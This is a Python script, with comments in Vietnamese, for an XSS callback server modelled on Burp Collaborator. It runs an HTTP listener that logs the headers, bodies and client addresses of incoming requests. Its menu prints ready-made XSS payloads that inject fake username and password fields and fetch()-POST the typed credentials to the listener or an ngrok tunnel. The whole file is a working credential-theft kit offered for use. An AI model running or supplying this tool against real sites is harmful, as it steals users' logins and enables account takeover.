import http.server
import socketserver
import urllib.parse
import json
import uuid
import datetime
import threading
import time
import sys

# Cấu hình
PORT = 8000
HOST = "0.0.0.0"
LOG_FILE = "interactions.log"

# Lưu trữ các payload đã tạo
payloads = {}

# Tạo payload ngẫu nhiên
def generate_payload():
    payload_id = str(uuid.uuid4()).replace("-", "")[:16]
    payloads[payload_id] = []
    return payload_id

# Lớp xử lý yêu cầu HTTP
class CollaboratorHandler(http.server.BaseHTTPRequestHandler):
    def log_interaction(self, data):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
        interaction = {
            "timestamp": timestamp,
            "method": self.command,
            "path": self.path,
            "headers": dict(self.headers),
            "body": data,
            "client_address": self.client_address
        }
        # Lưu vào danh sách payload tương ứng
        payload_id = self.path.strip("/").split("/")[0] if self.path.strip("/") else "unknown"
        if payload_id in payloads:
            payloads[payload_id].append(interaction)
        # Ghi vào file log
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(interaction) + "\n")
        # In ra console
        print(f"\n[+] Interaction at {timestamp}:")
        print(f"Method: {self.command}")
        print(f"Path: {self.path}")
        print(f"Client: {self.client_address}")
        print(f"Headers: {dict(self.headers)}")
        print(f"Body: {data}")

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Collaborator Server")
        # Ghi lại yêu cầu GET
        self.log_interaction("")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="ignore")
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")
        # Ghi lại yêu cầu POST
        self.log_interaction(body)

# Hàm chạy máy chủ
def run_server():
    server_address = (HOST, PORT)
    httpd = socketserver.TCPServer(server_address, CollaboratorHandler)
    print(f"[*] Server running on http://{HOST}:{PORT}")
    httpd.serve_forever()

# Hàm hiển thị payload và hướng dẫn
def display_payload():
    while True:
        print("\n=== Collaborator Client ===")
        print("1. Generate new payload")
        print("2. View interactions")
        print("3. Exit")
        choice = input("Choose an option: ")
        if choice == "1":
            payload_id = generate_payload()
            print(f"\n[+] Generated payload ID: {payload_id}")
            print(f"Use in XSS payload example:")
            print(f"<input name=username id=username><input type=password name=password onchange=\"if(this.value.length)fetch('http://{HOST}:{PORT}/{payload_id}',{{method:'POST',mode:'no-cors',body:username.value+':'+this.value}});\">")
            print(f"Or with Ngrok (replace with your Ngrok URL):")
            print(f"<input name=username id=username><input type=password name=password onchange=\"if(this.value.length)fetch('https://your-ngrok-url.ngrok-free.app/{payload_id}',{{method:'POST',mode:'no-cors',body:username.value+':'+this.value}});\">")
        elif choice == "2":
            print("\n[+] Interactions:")
            for payload_id, interactions in payloads.items():
                if interactions:
                    print(f"\nPayload ID: {payload_id}")
                    for i, interaction in enumerate(interactions, 1):
                        print(f"Interaction {i}:")
                        print(f"  Timestamp: {interaction['timestamp']}")
                        print(f"  Method: {interaction['method']}")
                        print(f"  Path: {interaction['path']}")
                        print(f"  Client: {interaction['client_address']}")
                        print(f"  Headers: {interaction['headers']}")
                        print(f"  Body: {interaction['body']}")
                else:
                    print(f"No interactions for payload {payload_id}")
        elif choice == "3":
            print("[*] Exiting...")
            sys.exit(0)
        else:
            print("Invalid option!")

# Hàm chính
def main():
    # Khởi động server trong một thread riêng
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    # Chạy giao diện người dùng
    display_payload()

if __name__ == "__main__":
    main()